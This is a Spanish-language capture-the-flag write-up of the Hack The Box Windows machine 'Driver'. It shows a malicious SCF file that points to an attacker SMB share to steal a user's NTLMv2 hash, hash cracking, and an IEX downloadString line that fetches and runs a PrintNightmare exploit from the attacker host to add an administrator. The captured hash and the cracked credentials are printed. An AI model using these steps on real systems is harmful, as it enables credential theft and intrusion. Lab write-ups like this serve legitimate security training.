---
layout: single
title: Driver - Hack The Box
excerpt: "En este post estaremos resolviendo la maquina Driver de la plataforma de Hackthebox es una maquina Windows donde vamos a tener que aprovecharnos de que podemos subir un SCF malicioso para robar el Hash NTLMv2 de un usuario que revisa los archivos que se suben una vez teniendo su contraseña nos conectaremos con evil-winrm a la maquina y para la escalada de privilegios nos aprovecharemos de que se esta corriendo spoolsv y usaremos el PrintNightmare"
date: 2023-06-08
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-driver/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - SCF Malicious File
  - Print Spooler Local Privilege Escalation (PrintNightmare)
  - spoolsv.exe 
---

⮕ Maquina Windows

```bash
❯ ping -c 1 10.10.11.106
PING 10.10.11.106 (10.10.11.106) 56(84) bytes of data.
64 bytes from 10.10.11.106: icmp_seq=1 ttl=127 time=109 ms

--- 10.10.11.106 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.775/108.775/108.775/0.000 ms
❯ whichSystem.py 10.10.11.106

10.10.11.106 (ttl -> 127): Windows
```

## PortScan

```bash
❯ nmap -sCV -p80,135,445,5985 10.10.11.106 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 12:53 CST
Nmap scan report for 10.10.11.106
Host is up (0.11s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-09T01:53:28
|_  start_date: 2023-06-09T01:44:24
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

## Enumeracion

En el puerto **80** vemos que nos dicen que **401** **Unauthorized** lo mas probable es que haya un panel de login

Vamos a validar con **crackmapexec** para ver ante que estamos

```bash
❯ crackmapexec smb 10.10.11.106
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
```

Ahora vamos usar la herramienta **smbclient** para ver si podemos listar recursos compartidos a nivel de red empleando un **Null Session** por que asta ahora no tenemos credenciales validas

```bash
❯ smbclient -L 10.10.11.106 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

Pero nada vamos a validarlo con otra herramienta pero aun así no podemos ver nada 

```bash
❯ smbmap -H 10.10.11.106 -u 'null'
[!] Authentication error on 10.10.11.106
```

Como aun no tenemos credenciales validas lo que vamos a hacer es usar **whatweb** para ver las tecnologías que corre el puerto **80**

```ruby
❯ whatweb http://10.10.11.106
http://10.10.11.106 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.106], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]

```

Esta es la web 

![](/assets/images/htb-writeup-driver/web1.png)

Si probamos con credenciales típicas de **admin:admin** funciona

![](/assets/images/htb-writeup-driver/web2.png)

Si no se te hubiera ocurrido esas credenciales puedes usar el siguiente script de python3 como alternativa que hice <https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Driver/login.py>

Si vamos a **Firmware Updates** vemos que nos dicen que podemos seleccionar una impresora y subir un **Firmware** pero pues subiremos un archivo malicioso 

![](/assets/images/htb-writeup-driver/web3.png)

# SCF Malicious File 

Y bueno nos están diciendo que el equipo revisa las subidas de archivos manualmente así que si alguien por detrás esta revisando los archivos podemos tratar de obtener su **hash** **NTLMv2** <https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/>

![](/assets/images/htb-writeup-driver/web5.png)

Vamos a estar usando un archivo **SCF** (Shell Command Files) cuando tu subes un archivo como este nosotros vamos a decirle que cargue un icono que esta alojado en nuestra maquina de atacante mediante un recurso compartido a nivel de red y podemos ponerle cualquier nombre al icono (el icono no es necesario que exista)

```bash
❯ catn yourhash.scf
[Shell]
Command=2
IconFile=\\10.10.14.9\smbFolder\pentestlab.ico
[Taskbar]
Command=ToggleDesktop

```

Ahora vamos a usar **smbserver** para hacer esto ademas le estamos dando soporte ala versión 2 de smb por que es un **Windows 10** 

```bash
❯ smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Bueno ahora lo que vamos a hacer es subir el archivo en el apartado de **Firmware Updates** como va a tratar de cargar el icono y el icono lo tenemos nosotros en nuestro recurso compartido a nivel de red cuando se carga debe de haber una autenticacion entonces si funciona nos llegara el **Hash** **NTLMv2** del usuario que revisa el archivo que podemos crackear offline

![](/assets/images/htb-writeup-driver/web4.png)

Y bueno una vez lo subimos nos llega el **Hash** del usuario **Tony**

```bash
❯ smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.106,49414)
[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:aaaaaaaaaaaaaaaa:56b838deb5548260bac18adeb656beb1:010100000000000080bd3170419ad9016b7d283652991d1d000000000100100070005700760065004a00630074006f000300100070005700760065004a00630074006f0002001000690043004f005800670073004800630004001000690043004f00580067007300480063000700080080bd3170419ad901060004000200000008003000300000000000000000000000002000007d56943e2a2cccd215c04e6870ed829aa62c358c99631b089f4e2d429dbc55500a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003900000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbFolder)
[*] Closing down connection (10.10.11.106,49414)
[*] Remaining connections []

```

Ahora lo que vamos a hacer es crackear el **hash**

```bash
❯ catn hash
tony::DRIVER:aaaaaaaaaaaaaaaa:56b838deb5548260bac18adeb656beb1:010100000000000080bd3170419ad9016b7d283652991d1d000000000100100070005700760065004a00630074006f000300100070005700760065004a00630074006f0002001000690043004f005800670073004800630004001000690043004f00580067007300480063000700080080bd3170419ad901060004000200000008003000300000000000000000000000002000007d56943e2a2cccd215c04e6870ed829aa62c358c99631b089f4e2d429dbc55500a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003900000000000000000000000000

```

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)
1g 0:00:00:00 DONE (2023-06-08 13:48) 3.846g/s 122092p/s 122092c/s 122092C/s !!!!!!..225566
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Vamos a validar si las credenciales son validas con **crackmapexec** **tony:liltony** y si es valida 

```bash
❯ crackmapexec smb 10.10.11.106 -u 'tony' -p 'liltony'
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
```

Ahora lo que vamos a hacer es revisar si ponemos conectarnos con **evil-winrm** y si podemos

```bash
❯ crackmapexec winrm 10.10.11.106 -u 'tony' -p 'liltony'
SMB         10.10.11.106    5985   NONE             [*] None (name:10.10.11.106) (domain:None)
HTTP        10.10.11.106    5985   NONE             [*] http://10.10.11.106:5985/wsman
WINRM       10.10.11.106    5985   NONE             [+] None\tony:liltony (Pwn3d!)
WINRM       10.10.11.106    5985   NONE             [-] None\tony:liltony "'NoneType' object has no attribute 'upper'"
```

Si validamos con **smbmap** los recursos compartidos a nivel de red básicamente solo tenemos permiso de lectura en ese recurso pero como podemos conectarnos por **winrm** 

![](/assets/images/htb-writeup-driver/web6.png)

## Shell tony 

```bash
❯ evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
*Evil-WinRM* PS C:\Users\tony\Documents> 
```

Estamos en la maquina victima

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::6f
   IPv6 Address. . . . . . . . . . . : dead:beef::c825:e03d:9222:1bcc
   Temporary IPv6 Address. . . . . . : dead:beef::9892:ece1:d558:715e
   Link-local IPv6 Address . . . . . : fe80::c825:e03d:9222:1bcc%5
   IPv4 Address. . . . . . . . . . . : 10.10.11.106
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:a809%5
                                       10.10.10.2

Tunnel adapter isatap.{99C52957-7ED3-4943-91B6-CD52EF4D6AFC}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : htb
*Evil-WinRM* PS C:\Users\tony\Documents> 
```

Nos pudimos conectar gracias a que estamos en el grupo **Remote Management Users** 

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> net user tony
User name                    tony
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/7/2021 11:49:20 PM
Password expires             Never
Password changeable          9/7/2021 11:49:20 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/8/2023 7:56:41 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users
Global Group memberships     *None
The command completed successfully.

*Evil-WinRM* PS C:\Users\tony\Documents> 

```

## User.txt 

```bash
*Evil-WinRM* PS C:\Users\tony\Desktop> dir


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/8/2023   6:44 PM             34 user.txt


*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
70de50963da0ea7c6ee2686e2e2a2d65
*Evil-WinRM* PS C:\Users\tony\Desktop> 
```

## Escalada de Privilegios 

No vemos nada interesante

```bash
*Evil-WinRM* PS C:\Users\tony\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
*Evil-WinRM* PS C:\Users\tony\Desktop> 
```

No vemos nada interesante

```bash
*Evil-WinRM* PS C:\Users\tony\Desktop> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
driver\tony S-1-5-21-3114857038-1253923253-2196841645-1003


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

*Evil-WinRM* PS C:\Users\tony\Desktop> 
```

Para enumerar un poco mas el sistema <https://github.com/carlospolop/PEASS-ng/releases/tag/20230604-b0985b44>

```bash
*Evil-WinRM* PS C:\Users\tony\Desktop> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> mkdir Escalada


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/8/2023   8:19 PM                Escalada


*Evil-WinRM* PS C:\Windows\Temp> cd Escalada
*Evil-WinRM* PS C:\Windows\Temp\Escalada> 
```

Ahora nos lo vamos a transferir a la maquina victima

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.106 - - [08/Jun/2023 14:56:19] "GET /winPEASx64.exe HTTP/1.1" 200 -
```

```bash
*Evil-WinRM* PS C:\Windows\Temp\Escalada> curl http://10.10.14.9:80/winPEASx64.exe -o Winpeas.exe
```

Ahora simplemente lo ejecutamos

```bash
*Evil-WinRM* PS C:\Windows\Temp\Escalada> .\Winpeas.exe
```

Y bueno una vez ejecutado vemos esto que ya es interesante por que se esta corriendo **spoolsv**

![](/assets/images/htb-writeup-driver/web7.png)

![](/assets/images/htb-writeup-driver/web8.png)

Si buscamos vulnerabilidades sobre eso encontramos esto <https://github.com/calebstewart/CVE-2021-1675> <https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1>

Ahora lo pasamos ala maquina victima

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.106 - - [08/Jun/2023 15:20:06] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
```

```bash
*Evil-WinRM* PS C:\Windows\Temp\Escalada> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/CVE-2021-1675.ps1')
```

Ahora siguiendo los pasos del repositorio vamos a crear un nuevo usuario

```bash
*Evil-WinRM* PS C:\Windows\Temp\Escalada> Invoke-Nightmare -DriverName "Xerox" -NewUser "miguelrega7" -NewPassword "miguel123$!"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user miguelrega7 as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\Windows\Temp\Escalada> net user 

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
miguelrega7              tony
The command completed with one or more errors.

*Evil-WinRM* PS C:\Windows\Temp\Escalada> 
```

Estamos en el grupo **Administrators**

```bash
*Evil-WinRM* PS C:\Windows\Temp\Escalada> net user miguelrega7
User name                    miguelrega7
Full Name                    miguelrega7
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/8/2023 9:25:16 PM
Password expires             Never
Password changeable          6/8/2023 9:25:16 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.

*Evil-WinRM* PS C:\Windows\Temp\Escalada> 
```

Vamos a verificarlo con **crackmapexec**

```bash
❯ crackmapexec winrm 10.10.11.106 -u 'miguelrega7' -p 'miguel123$!'
SMB         10.10.11.106    5985   NONE             [*] None (name:10.10.11.106) (domain:None)
HTTP        10.10.11.106    5985   NONE             [*] http://10.10.11.106:5985/wsman
WINRM       10.10.11.106    5985   NONE             [+] None\miguelrega7:miguel123$! (Pwn3d!)
WINRM       10.10.11.106    5985   NONE             [-] None\miguelrega7:miguel123$! "'NoneType' object has no attribute 'upper'"
```

Como el usuario que creamos esta en grupo **Administrators** ya podemos meternos a la ruta donde esta la flag

## Root flag

```bash
❯ evil-winrm -i 10.10.11.106 -u 'miguelrega7' -p 'miguel123$!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\miguelrega7\Documents> 
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
6f4021989bd0ea038e6a434993e78549
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
